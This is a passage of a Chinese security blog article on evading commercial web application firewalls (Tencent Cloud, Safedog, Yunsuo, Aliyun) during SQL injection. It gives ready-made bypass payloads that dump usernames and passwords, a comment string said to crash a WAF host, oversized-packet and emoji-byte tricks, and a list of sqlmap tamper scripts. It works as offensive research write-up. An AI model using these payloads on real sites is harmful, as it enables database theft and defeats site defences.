<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_4bd635407eb1a01.png" alt="" /><br />
<img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_91909dc899a45de.png" alt="" /></p>
<p>由于后面在调用自定义变量的时候需要用到union+select，所以还需要绕过这个点。/*ddd*/union/*ddd*/select 就可以了。</p>
<p>Bypass Payload：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_b501c682de4991f.png" alt="" /></p>
<p>如何做到通过推理绕过waf？这里举一个腾讯云安全的案例：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_3f2cf66f61f2f82.png" alt="" /></p>
<p>绕过思路: 首先看看腾讯云安全怎么检测sql注入的，怎么匹配关键字会被拦截，怎么匹配不会?</p>
<p>union+select拦截</p>
<p>select+from拦截</p>
<p>union+from不拦截</p>
<p>那么关键的点就是绕过这个select关键字</p>
<p>select all</p>
<p>select distinct</p>
<p>select distinctrow</p>
<p>既然这些都可以，再想想使用这样的语句怎么不被检测到？select与all中间肯定不能用普通的/**/这种代替空格，还是会被视为是union+select。select all可以这么表达/*!12345select all*/，腾讯云早已识破这种烂大街的招式。尝试了下/*!*/中间也可以使用%0a换行。</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_21217eee0b21e5e.png" alt="" /></p>
<p>/*!12345%0aselect%20all*/还是会被拦截，这就说明腾讯云在语法检测的时候会忽略掉数字后面的%0a换行，虽然属于union+12342select，但简单的数字和关键字区分识别还是做得到。再测试/*!12345select%0aall*/，结果就合乎推理了，根据测试知道腾讯云安全会忽略掉%0a换行，这就等于union+12345selectall， 不会被检测到。（忽略掉%0a换行为了过滤反而可以用来加以利用进行Bypass）</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_c16f7be60820617.png" alt="" /><br />
<img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_079a5da7ce78c7f.png" alt="" /></p>
<p>可能会问，推理的依据并不能真正意义上证明忽略掉了%0a啊？当然要证明下啊，/*!12345%0aselect%0aall*/就被拦截了，说明刚开始检测到12345%0aselect就不再检测后方的了，union+12345select就已经可以拦截掉了。</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_7261186f34f96d2.png" alt="" /><br />
还可能会问，既然忽略掉了%0a，那么/*!select%0aall*/是不是也可以啊，然而并不行。合理的推理很有必要。<br />
Bypass Payload:</p>
<pre>    1' union/*!50000select%0aall*/username from users%23
    1' union/*!50000select%0adistinct*/username from users%23
    1' union/*!50000select%0adistinctrow*/username from users%23
</pre>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_c8ed256f18b265e.png" alt="" /></p>
<p>不是绕不过狗，只是不够细心：</p>
<pre>    union+select拦截。
    select+from拦截。
    union+from不拦截。
    fuzz了下/*!50000select*/这个5位数，前两位数&lt;50 &amp;&amp; 第二位!==0 &amp;&amp; 后三位数==0即可bypass。(一点细节也不要放过。)
</pre>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_bec0ad2a1a75b29.png" alt="" /><br />
<img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_f605b75df3a04a2.png" alt="" /></p>
<p>测试环境</p>
<pre>    Windows Server 2008 + APACHE + PHP + Mysql Bypass Payload:
    1' union/*!23000select*/user,password from users%23
</pre>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_a7975228824131d.png" alt="" /><br />
<img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_c4336f788e8a987.png" alt="" /></p>
<p>这里证明一个观点：好姿势不是死的，零零碎碎玩不转的姿势巧妙的结合一下。所以说一个姿势被拦截不代表就少了一个姿势。</p>
<h2>0x04 别按套路出牌</h2>
<p>云锁版本迭代导致的 &amp; 360主机卫士一直存在的问题：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_bf2dcb8de6db8cd.jpg" alt="" /></p>
<p>注意POST那个方向，waf在检测POST传输的数据过程中，没有进行URL的检测，也就是说waf会认为URL上的任何参数信息都是正常的。既然是POST请求，那就只检测请求正文咯。(神逻辑)</p>
<p>在标准HTTP处理流程中，只要后端有接收GET形式的查询字段，即使客户端用POST传输，查询字符串上满足查询条件时，是会进行处理的。（没毛病）</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_f5039fb4f79fc42.png" alt="" /><br />
<img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_b2a887224aa58f4.png" alt="" /><br />
<img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_b1b4d35c4ffe0dd.png" alt="" /></p>
<p>当waf成了宕机的罪魁祸首是什么样的？举一个安全狗的案例：</p>
<pre>/*66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666*/
</pre>
<p>注释中包含超长查询字符串，导致安全狗在识别的过程中挂掉了，连带着整个机器Service Unavailable：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_c31dc7578deb118.jpg" alt="" /></p>
<p>再举一个云锁也是因为数据包过长导致绕过的案例：</p>
<p>云锁在开始检测时先判断包的大小是否为7250byte以下，n为填充包内容，设置n大小为2328时，可以正常访问页面，但是会提示拦截了SQL注入</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_ce6771b24a87d31.png" alt="" /></p>
<p>当数据包超过2329时就可以成功绕过，2329长度以后的就不检测了。？</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_11e7a171b0ccb6d.png" alt="" /></p>
<h2>0x05 猥琐很重要</h2>
<p>这里讲个有意思的案例，并且是当时影响了安全宝、阿里云盾的姿势：<br />
有次睡前想到的，emoji图标！是的，平时做梦并没有美女与野兽。当时只是随便一想，第二天问了5up3rc，他说他也想过，但测试并没有什么效果</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_4b7e77b8be1db3b.png" alt="" /></p>
<p>emoji是一串unicode字集组成，一个emoji图标占5个字节，mysq也支持emoji的存储，在mysql下占四个字节:</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_7cf7ad26d7c596d.png?1173" alt="" /></p>
<p>既然在查询的时候%23会忽略掉后面的，那么Emoji就可以插入到%23与%0A之间。再加多试了试，成功绕过了，200多个emoji图标，只能多，但少一个都不行。。。</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_4ce3a2a9e859522.png?893" alt="" /></p>
<p>可能会说，这是因为超⻓查询导致的绕过吧?并不是。</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_b9ca972fbf4a347.png?423" alt="" /></p>
<p>这么⻓，mysql也是会执行的:</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_9e6c1c6a745dba6.png?431" alt="" /><br />
<img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_b24bcd98408a624.png?530" alt="" /></p>
<p>我们再来测试阿里云盾：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_69e39219128d42e.png?241" alt="" /></p>
<p>当缩少emoji数量的话会拦截，想想还是再加多些试试:</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_e07432fd7c0223e.png?300" alt="" /></p>
<p>还是拦截，那刚才的没拦截是怎么回事?点根烟，逐一进行排查。发现能绕过的原因和emoji数量无关，而是某个emoji可以。</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_fdd778d2306daf2.png" alt="" /></p>
<p>就是这个愤怒的emoji，其他的emoji都不行。唯独愤怒脸可以:</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_27dfdf52dae2d89.png" alt="" /></p>
<p>将这些emoji进行urlencode看看特征，究竟是什么原因?看看哪些emoji插入不会被拦截:</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_baa04579a8406f9.png" alt="" /></p>
<p>有些emoji进行urlencode后是很⻓的，因为是几个emoji进行组合的。</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_be459c14beb339d.png" alt="" /></p>
<p>将这些payload进行注入进去。</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_4c84e726e9ac7dd.png" alt="" /></p>
<p>难道只有这个愤怒脸插入进去就可以绕过?也不能这么说，我发现能绕过的字符都是ascii码超过了127的字符：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_bad805652340353.png" alt="" /></p>
<p>那为什么愤怒脸的emoji可以?这里提到emoji的特征，常⻅的emoji是四位组成，前三位多数是一致的，把这三位插入payload试试:</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_8574247b002533b.png" alt="" /></p>
<p>可以实现绕过，再来看看愤怒脸的urlencode:</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_1df235c4575549d.png" alt="" /></p>
<p>最后一位是%a0，那么也就是说完全可以忽略掉最后一位，而多数emoji第四位是 ascii 127的字符，会导致waf引擎无法检测。</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_e2ae4735e4e7464.png?335" alt="" /><br />
<img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_0a42bd57150c6d3.png" alt="" /></p>
<h2>0x06 自动化Bypass</h2>
<p>首先总结下sqlmap的各种bypass waf tamper：</p>
<pre>    apostrophemask.py 用UTF-8全角字符替换单引号字符
    apostrophenullencode.py 用非法双字节unicode字符替换单引号字符
    appendnullbyte.py 在payload末尾添加空字符编码
    base64encode.py 对给定的payload全部字符使用Base64编码
    between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”
    bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”
    chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）
    charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）
    charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）
    concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例
    equaltolike.py 用“LIKE”运算符替换全部等于号“=”
    greatest.py 用“GREATEST”函数替换大于号“&gt;”
    halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释
    ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例
    lowercase.py 用小写值替换每个关键字字符
    modsecurityversioned.py 用注释包围完整的查询
    modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询
    multiplespaces.py 在SQL关键字周围添加多个空格
    nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器
    overlongutf8.py 转换给定的payload当中的所有字符
    percentage.py 在每个字符之前添加一个百分号
    randomcase.py 随机转换每个关键字字符的大小写
    randomcomments.py 向SQL关键字中插入随机注释
    securesphere.py 添加经过特殊构造的字符串
    sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs
    space2comment.py 用“/**/”替换空格符
    space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符
    space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
    space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
    space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
    space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符
    space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
    space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符
    space2plus.py 用加号“+”替换空格符
    space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
    unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”
    unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符
    varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF
    versionedkeywords.py 用MySQL注释包围每个非函数关键字
    versionedmorekeywords.py 用MySQL注释包围每个关键字
    xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF
</pre>
<p>看起来很全，但有个缺点就是功能单一，灵活程度面对当今的主流waf来说很吃力了。<br />
鉴于多数waf产品是使用Rule进行防护，那么这里也不提什么高大上的机器学习。就是简单粗暴的fuzz。</p>
<p>去年黄登提到过建立有毒标示模型，根据这个模型将waf进行训练。</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_93cf1802923c514.png" alt="" /></p>
<p>我把每个sql关键字两侧可插入的点称之为“位”，最基本的一句注入语句就有这些位：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_1933afff84d7bf1.png" alt="" /></p>
<pre>    假设有n个有毒标示
    最基本的注入语句可以插入五个位
    这五个位定义为a1,a2...a5
    那么结果将会是多少呢？
</pre>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/Mon_1611/4_1241860009050136_f10c69ef474518e.png?12" alt="" /></p>
<p>这个是叠加的，关键字不止这些，稍微复杂一点的环境就会需要更多的关键字来注入，也就会需要fuzz更多的位。<br />
还需要经过各种编码过后，根据数据库的样式使用相应的特性和配合的函数等等。<br />
当前几个关键字达到绕过效果时，只需继续fuzz后面几个位即可。<br />
还有就是传输过程中可测试的点：</p>
<p><img class="aligncenter" src="http://xianzhi.aliyun.com/forum/attachment/thumb/Mon_1611/4_1241860009050136_60e832e4bc49cc9.png" alt="" /></p>
<p>因为当我们在传输的过程中导致的绕过往往是致命的，比如中间件的特性/缺陷，导致waf不能识别或者是在满足特定条件下的欺骗了waf。</p>
<h2>0x07 End</h2>
<p>一写起来就根本停不起来，后期决定出一系列waf绕过文，例如文件上传、webshell防御、权限提升等Waf绕过。xss的bypass就算了，防不胜防…</p>
<ul>
<li>Author：Tr3jer_CongRong</li>
<li>Blog：www.Thinkings.org</li>
<li>Mail：<a href="mailto:Tr3jer@gmail.com">Tr3jer@gmail.com</a></li>
</ul>
<p>【本文转自<a href="https://www.secpulse.com/archives/53328.html" target="_blank">脉搏战略合作伙伴</a><a href="https://xianzhi.aliyun.com/" target="_blank">先知技术社区</a> <a href="https://xianzhi.aliyun.com/forum/read/349.html" target="_blank">原帖地址</a>  安全脉搏编辑<a href="https://www.secpulse.com/archives/author/huan9740" target="_blank">Joey</a>整理发布】</p>
		<div class="pageShenming">
【安全脉搏：分享技术、悦享品质。文章仅代表作者看法，如有不同观点，欢迎添加安全脉搏微信号：SecPulse，进行交流。】</div>
<div class="post-tags"><span>Tags: </span><a href="https://www.secpulse.com/archives/tag/bypass" rel="tag">bypass</a><a href="https://www.secpulse.com/archives/tag/bypass-payload" rel="tag">Bypass Payload</a><a href="https://www.secpulse.com/archives/tag/emoji" rel="tag">emoji</a><a href="https://www.secpulse.com/archives/tag/http-parameter-pollution" rel="tag">HTTP Parameter Pollution</a><a href="https://www.secpulse.com/archives/tag/http%e5%8f%82%e6%95%b0%e6%b1%a1%e6%9f%93" rel="tag">HTTP参数污染</a><a href="https://www.secpulse.com/archives/tag/Mysql" rel="tag">Mysql</a><a href="https://www.secpulse.com/archives/tag/sql%e6%b3%a8%e5%85%a5" rel="tag">Sql注入</a><a href="https://www.secpulse.com/archives/tag/tr3jer_congrong" rel="tag">Tr3jer_CongRong</a><a href="https://www.secpulse.com/archives/tag/waf%e7%bb%95%e8%bf%87" rel="tag">WAF绕过</a><a href="https://www.secpulse.com/archives/tag/%e4%ba%91%e7%9b%be" rel="tag">云盾</a><a href="https://www.secpulse.com/archives/tag/%E4%BA%91%E9%94%81" rel="tag">云锁</a><a href="https://www.secpulse.com/archives/tag/%e5%85%88%e7%9f%a5%e6%8a%80%e6%9c%af" rel="tag">先知技术</a><a href="https://www.secpulse.com/archives/tag/%e5%88%a9%e7%94%a8%e6%b3%a8%e9%87%8a%e7%ae%80%e5%8d%95%e7%bb%95%e8%bf%87%e4%ba%91%e9%94%81" rel="tag">利用注释简单绕过云锁</a><a href="https://www.secpulse.com/archives/tag/%e6%88%91%e7%9a%84wafbypass%e4%b9%8b%e9%81%93" rel="tag">我的WafBypass之道</a><a href="https://www.secpulse.com/archives/tag/%e6%ad%a3%e5%88%99%e9%80%83%e9%80%b8" rel="tag">正则逃逸</a><a href="https://www.secpulse.com/archives/tag/%e6%ad%a3%e5%88%99%e9%80%83%e9%80%b8%e5%a4%a7%e6%b3%95" rel="tag">正则逃逸大法</a><a href="https://www.secpulse.com/archives/tag/%e6%bc%8f%e6%b4%9e%e7%a0%94%e7%a9%b6" rel="tag">漏洞研究</a><a href="https://www.secpulse.com/archives/tag/%e8%85%be%e8%ae%af%e4%ba%91%e5%ae%89%e5%85%a8" rel="tag">腾讯云安全</a></div>
		</div>
	<!-- .single-content -->
		<div class="pageActive">
	<div class="mark-like-btn">
							</div>
	<!-- Baidu Button BEGIN -->
	<div class="bdshare">
		<div class="bdsharebuttonbox">
			<a href="#" class="bds_more" data-cmd="more"></a><a href="#"
				class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#"
				class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#"
				class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
		</div>
		<script>
		window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};
		with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		</script>

	</div>
</div>    <section id="text-6" class="widget-container widget_text hidden-xs">			<div class="textwidget"><center><a href="https://www.duoyinsu.com" target="_blank" title="安识科技 专业安全服务商"><img src="https://www.secpulse.com/wp-includes/images/secweixin.png" style="width:785px;height:315px"></a><center></div>
		</section><section id="related_post-2" class="widget-container widget_related_post hidden-xs"><h3 class="widget-title">相关文章</h3>

	<ul class="related_post">
				<li><a href="https://www.secpulse.com/archives/59497.html" title="详细阅读 XSS挑战之旅学习总结">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/04/xss_s.png&h=150&w=249&zc=1" alt="XSS挑战之旅学习总结" class="xg-img"/>
		<p>XSS挑战之旅学习总结</P></a></li>
				<li><a href="https://www.secpulse.com/archives/59333.html" title="详细阅读 河北龙瀚高薪引进 安全技术总监、高级安全工程师等人才">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/07/zhaopin.jpg&h=150&w=249&zc=1" alt="河北龙瀚高薪引进 安全技术总监、高级安全工程师等人才" class="xg-img"/>
		<p>河北龙瀚高薪引进 安全技术总监、高级安全&hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/59262.html" title="详细阅读 跟着DVWA学Web安全开发">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/07/webappman_thumb.jpg&h=150&w=249&zc=1" alt="跟着DVWA学Web安全开发" class="xg-img"/>
		<p>跟着DVWA学Web安全开发</P></a></li>
			</ul>


</section></article>


<!-- 引用 -->
<div id="comments" class="comments-area">
		<h2 class="comments-title">
		3条评论
	</h2>
<!-- 显示正在加载新评论 -->
 <div id="loading-comments"><span>评论加载中，请稍等...</span></div>
	<ul class="commentlist">
			
	<li class="comment even thread-even depth-1" id="comment-7105">
	<div class="comment-author"><img src="https://www.secpulse.com/wp-content/uploads/2017/01/00f0b119ebc4b74591309ca0cdfc1e178b821500-150x150.jpg" width="40" height="40" alt="小冰" class="avatar avatar-40 wp-user-avatar wp-user-avatar-40 alignnone photo" /></div>
			<div id="div-comment-7105" class="commenttext">
		<div class="commentmeta">
		
		<!--<cite class="fn">小冰</cite> <span class="says">:</span>-->
		<span class="commentid">小冰</span>
		<span class="comment-meta commentmetadata">
			<a href="https://www.secpulse.com/archives/53328.html#comment-7105"></a>
			<span class="commenttime">
				2016年11月23日 下午4:40											
				</span>
			</span>
			<span class="reply">&nbsp;<a class='comment-reply-link' href='/archives/53328.html?replytocom=7105#respond' onclick='return addComment.moveForm( "comment-7105", "7105", "respond", "53328" )' aria-label='回复给小冰'>回复</a></span>
		</span>
	</div>
	<div class="commentp"><p>好样的 b(￣▽￣)d</p>
</div>
			</div>
	</li><!-- #comment-## -->
	
	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-7109">
	<div class="comment-author"><img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="40" height="40" alt="" class="avatar avatar-40wp-user-avatar wp-user-avatar-40 alignnone photo avatar-default" /></div>
			<div id="div-comment-7109" class="commenttext">
		<div class="commentmeta">
		
		<!--<cite class="fn">Kernel.C</cite> <span class="says">:</span>-->
		<span class="commentid">Kernel.C</span>
		<span class="comment-meta commentmetadata">
			<a href="https://www.secpulse.com/archives/53328.html#comment-7109"></a>
			<span class="commenttime">
				2016年11月25日 上午9:23											
				</span>
			</span>
			<span class="reply">&nbsp;<a class='comment-reply-link' href='/archives/53328.html?replytocom=7109#respond' onclick='return addComment.moveForm( "comment-7109", "7109", "respond", "53328" )' aria-label='回复给Kernel.C'>回复</a></span>
		</span>
	</div>
	<div class="commentp"><p>厉害,佩服</p>
</div>
			</div>
	</li><!-- #comment-## -->
	
	<li class="comment even thread-even depth-1" id="comment-7399">
	<div class="comment-author"><img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="40" height="40" alt="" class="avatar avatar-40wp-user-avatar wp-user-avatar-40 alignnone photo avatar-default" /></div>
			<div id="div-comment-7399" class="commenttext">
		<div class="commentmeta">
		
		<!--<cite class="fn">Clouds Flying</cite> <span class="says">:</span>-->
		<span class="commentid">Clouds Flying</span>
		<span class="comment-meta commentmetadata">
			<a href="https://www.secpulse.com/archives/53328.html#comment-7399"></a>
			<span class="commenttime">
				2017年02月03日 上午11:39											
				</span>
			</span>
			<span class="reply">&nbsp;<a class='comment-reply-link' href='/archives/53328.html?replytocom=7399#respond' onclick='return addComment.moveForm( "comment-7399", "7399", "respond", "53328" )' aria-label='回复给Clouds Flying'>回复</a></span>
		</span>
	</div>
	<div class="commentp"><p>666，厉害了</p>
</div>
			</div>
	</li><!-- #comment-## -->
	</ul><!-- .comment-list -->

			<div id="respond" class="comment-respond row">
		


			<form action="https://www.secpulse.com/wp-comments-post.php" method="post" id="commentform">
		
				
						
			<div id="comboxinfo">
					<div class="cominfodiv cominfodiv-author ">
					<p for="author" class="nicheng">
     <input type="text" name="author" id="author" class="texty" value="" tabindex="1" /> <span class="required">昵称*</span>
      </p>
</div>
					<div class="cominfodiv cominfodiv-email">
					<p for="email">	<input type="text" name="email" id="email" class="texty" value="" tabindex="2" /> <span class="required">邮箱*</span>
						</p>
					</div>
					<div class="cominfodiv cominfodiv-url">
					 	<p for="url"><input type="text" name="url" id="url" class="texty" value="" tabindex="3" /><span>网址 </span>
						</p>
					</div>
					
			
				
</div>		       <div class=" cominfodiv-nr">  
<textarea class="texty" name="w" id="comment" rows="10" tabindex="4" placeholder="输入评论内容..."></textarea><textarea name="comment" cols="100%" rows="4" style="display:none"></textarea>
							<div class="submitcom">
							
					<input id="submit" name="submit" type="submit" tabindex="5" value="提&nbsp;交"/>
					<input type='hidden' name='comment_post_ID' value='53328' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="e4cef33570" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="27"/></p>				</div>
				<div id="cancel_comment_reply"><a rel="nofollow" id="cancel-comment-reply-link" href="/archives/53328.html#respond" style="display:none;">取消回复</a></div>
			
</div>
			
				
			</form>
			
			
			<script type="text/javascript">
				document.getElementById("comment").onkeydown = function (moz_ev){
				var ev = null;
				if (window.event){
				ev = window.event;
				}else{
				ev = moz_ev;
				}
				if (ev != null && ev.ctrlKey && ev.keyCode == 13){
				document.getElementById("submit").click();}
				}
			</script></div>
	 		
</div>
<!-- #comments --></div>
		
<div class="xs-right sidebar xs-hidden xss-hidden">
	<div class="authorbox">
	<div class="author-top">
<div id="author-img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/01/Mon_1701-12_1312476865608221_2d3a3ff26432b63.png" width="96" height="87" alt="阿里云先知技术社区" class="avatar avatar-96 wp-user-avatar wp-user-avatar-96 alignnone photo" />
</div>
<div class="au-name">
<a href="https://www.secpulse.com/archives/author/aliyun_xianzhi" title="由阿里云先知技术社区发布" rel="author">阿里云先知技术社区</a><br>
 <span class="au-title">总共17篇文章</span>
</div> </div>
	<div class="author-word"><span class="quotes q1"></span>
	<span class="quotes q2"></span></div>
	</div>
	
				<aside id="recent-posts-2" class="widget-container widget_recent_entries">		<div class="si-title"><h2>最新脉搏</h2></div>		<ul>
					<li>
				<a href="https://www.secpulse.com/archives/60653.html">《安天365安全研究》第5期</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60630.html">供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60605.html">2017先知创新大会：有ZHI而来</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60576.html">甲方工作杂谈</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60394.html">Catfish—缓存漏洞&#038;&#038;配合CSRF到Getshell</a>
						</li>
				</ul>
		</aside><aside id="hot_comment-3" class="widget-container widget_hot_comment"><div class="si-title"><h2>脉搏热评</h2></div>
	<ul class="hot_comment_widget">
		
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59497.html" rel="bookmark" title="XSS挑战之旅学习总结 (7条评论)" >XSS挑战之旅学习总结</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59065.html" rel="bookmark" title="web安全之如何全面发现系统后台 (6条评论)" >web安全之如何全面发现系统后台</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59770.html" rel="bookmark" title="电商的支付风控怎么玩？ (3条评论)" >电商的支付风控怎么玩？</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59466.html" rel="bookmark" title="安天移动安全联合猎豹揭秘无形之贼Dosoft免杀病毒 (2条评论)" >安天移动安全联合猎豹揭秘无形之贼Doso&hellip;</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59262.html" rel="bookmark" title="跟着DVWA学Web安全开发 (2条评论)" >跟着DVWA学Web安全开发</a></li>			</ul>

</aside><aside id="random_post-2" class="widget-container widget_random_post"><div class="si-title"><h2>随机脉搏</h2></div>

	<ul class="random_post">
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/15527.html" rel="bookmark" title="详细阅读 百度网游存在支付漏洞">百度网游存在支付漏洞</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/39264.html" rel="bookmark" title="详细阅读 中兴某业务弱口令导致getshell">中兴某业务弱口令导致getshell</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/30430.html" rel="bookmark" title="详细阅读 奇虎360某站设计缺陷域名可导致被恶意利用(可用于绿标,博彩,钓鱼等)">奇虎360某站设计缺陷域名可导致被恶意利用(可用于绿标,博彩,钓鱼等)</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/39634.html" rel="bookmark" title="详细阅读 金蝶某OA办公系统通用POST注入漏洞">金蝶某OA办公系统通用POST注入漏洞</a></li>
